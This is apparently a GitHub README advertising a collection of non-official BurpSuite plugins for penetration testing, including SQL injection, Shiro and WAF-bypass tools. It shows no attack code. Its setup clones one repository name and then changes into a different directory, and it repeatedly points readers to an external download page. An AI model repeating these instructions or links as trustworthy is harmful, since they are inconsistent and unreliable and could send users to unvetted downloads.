# BurpSuite-collections - Plugin Collection 2026

> **A hand-picked set of BurpSuite plugins, extensions, and field-tested usage notes for security practitioners and penetration testers.** This repository gathers non-BApp Store plugins, writeups, and practical advice to help extend BurpSuite well beyond the official marketplace.

[![Scripts](https://img.shields.io/badge/Scripts-Collection-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-cross--platform-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/taylordaniel44/burpsuite-extension-hub?style=flat-square)](https://github.com/taylordaniel44/burpsuite-extension-hub)

---

<p align="center">
  <a href="https://taylordaniel44.github.io/burpsuite-extension-hub/">
    <img src="https://img.shields.io/badge/Download-BurpSuite%20Collections-brightgreen?style=for-the-badge" alt="Download BurpSuite Collections">
  </a>
</p>

> **[Direct Download - BurpSuite-collections](https://taylordaniel44.github.io/burpsuite-extension-hub/)**

---

[Download Latest Build](https://taylordaniel44.github.io/burpsuite-extension-hub/)

---

## Project Summary

If you need a reference point for BurpSuite add-ons that live outside the official BApp Store, this repository is built for that purpose. It collects Java extensions, Python-based integrations, and focused utilities for testing tasks such as SQL injection, Apache Shiro checks, and WAF bypass work. Alongside the tools themselves, you will also find related articles and tips intended to make them easier to drop into a penetration testing workflow.

The emphasis here is on community-created extensions that solve real testing problems. From request-tweaking helpers such as HackBar to sqlmap-related helpers and framework-oriented scanners like j2eescan, the collection keeps useful material in one place. The repository is maintained with newer techniques and plugin releases in mind, while no longer including crack files for BurpSuite itself.

---

## What Is Included

- **Burp Extensions** - Java plugins that expand BurpSuite's built-in features
- **Burp Requests** - Utilities for building and altering requests in advanced ways
- **BurpSuite Extender** - Add-ons designed for the Burp Extender API
- **BurpSuite Tools** - Helper scripts for automating testing routines
- **HackBar & SendTo** - Fast payload injection and forwarding utilities
- **SQLMap Integration** - Scripts that route sqlmap through Burp more smoothly
- **Shiro & WAF Tools** - Targeted scanners for Apache Shiro issues and WAF discovery
- **Python-Burp** - Python automation scripts that communicate with BurpSuite

---

## Getting Started

Clone the project and place the plugins where you normally keep BurpSuite Extender assets:

```bash
git clone https://github.com/taylordaniel44/burpsuite-extension-hub.git
cd BurpSuite-collections
```

Individual `.jar` or `.py` files can be loaded from BurpSuite's Extender tab. For instance, to run the Shiro scanner:

1. Open BurpSuite -> Extender -> Extensions
2. Click "Add" and choose the `shiro-burp.jar` file
3. The extension will then show up in the Extensions list

---

## Compatibility

| Component | Supported Versions |
|-----------|-------------------|
| BurpSuite Community | 2022.x - 2024.x |
| BurpSuite Professional | 2022.x - 2024.x |
| Java Runtime | Java 11+ |
| Python (for py extensions) | Python 3.6+ |

---

## Repository Structure

```
BurpSuite-collections/
├── burp-extensions/       # Java-based plugin JARs
├── burp-requests/         # Request manipulation tools
├── burpsuite-tools/       # Utility scripts and helpers
├── python-burp/           # Python integration scripts
├── configs/               # Sample configuration files
├── docs/                  # Usage guides and articles
└── examples/              # Demonstration scripts
```

---

## Questions and Answers

**How often is this collection updated?**  
Updates are made from time to time as new plugins and techniques appear. Review the commit history to see the latest additions.

**Can I customize the plugins?**  
Yes. Most of the extensions are open-source, so you can adjust the source code to match your own testing requirements.

**Are these plugins compatible with the latest BurpSuite version?**  
The goal is to keep pace with recent BurpSuite releases, but some older plugins may need changes. Check the documentation for each individual plugin.

**Where are the plugins stored locally?**  
Once downloaded, the plugins stay in your local clone directory. You can relocate them anywhere and load them through BurpSuite's Extender interface.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
